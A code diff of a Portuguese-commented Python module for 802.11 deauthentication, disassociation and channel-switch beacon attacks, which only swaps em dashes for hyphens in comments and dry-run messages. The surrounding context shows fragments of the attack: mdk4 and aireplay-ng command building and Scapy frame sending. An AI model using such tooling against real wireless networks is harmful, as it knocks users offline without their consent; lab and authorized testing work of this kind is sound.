@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
+# Author: André Henrique (@mrhenrique) | União Geek - https://github.com/Uniao-Geek
 """Suite avançada de deautenticação, desassociação e CSA (802.11) para laboratório autorizado.
 
 Combina aireplay-ng, Scapy, mdk4, flood de desassociação e beacons com IE de Channel
@@ -95,7 +95,7 @@ class Exploit(Exploit):
     def _iw_set_channel(self, iface: str, ch: int) -> None:
         """Define canal na interface via ``iw`` (Linux)."""
         if self.dry_run:
-            print_info(f"DRY RUN — iw dev {iface} set channel {ch}")
+            print_info(f"DRY RUN - iw dev {iface} set channel {ch}")
             return
         try:
             subprocess.run(
@@ -152,7 +152,7 @@ class Exploit(Exploit):
             cmd.extend(["-c", client])
         cmd.append(iface)
         if self.dry_run:
-            print_info("DRY RUN — {}".format(" ".join(cmd)))
+            print_info("DRY RUN - {}".format(" ".join(cmd)))
             return
         if ch is not None:
             self._iw_set_channel(iface, ch)
@@ -174,7 +174,7 @@ class Exploit(Exploit):
         if client and client.upper() != "FF:FF:FF:FF:FF:FF":
             cmd.extend(["-S", client])
         if self.dry_run:
-            print_info("DRY RUN — {}".format(" ".join(cmd)))
+            print_info("DRY RUN - {}".format(" ".join(cmd)))
             return
         print_status("mdk4: {}".format(" ".join(cmd)))
         try:
@@ -213,7 +213,7 @@ class Exploit(Exploit):
             ]
 
         if self.dry_run:
-            print_info(f"DRY RUN — Scapy deauth: {len(pkts)} frame(s) ap={ap} sta={sta}")
+            print_info(f"DRY RUN - Scapy deauth: {len(pkts)} frame(s) ap={ap} sta={sta}")
             return len(pkts)
 
         n = 0
@@ -254,7 +254,7 @@ class Exploit(Exploit):
             ]
 
         if self.dry_run:
-            print_info(f"DRY RUN — Scapy disassoc: {len(pkts)} frame(s)")
+            print_info(f"DRY RUN - Scapy disassoc: {len(pkts)} frame(s)")
             return len(pkts)
 
         n = 0
@@ -287,7 +287,7 @@ class Exploit(Exploit):
         )
 
         if self.dry_run:
-            print_info(f"DRY RUN — CSA beacon ap={ap} -> ch {new_ch}")
+            print_info(f"DRY RUN - CSA beacon ap={ap} -> ch {new_ch}")
             return 1
 
         sendp(pkt, iface=iface, count=1, verbose=False)
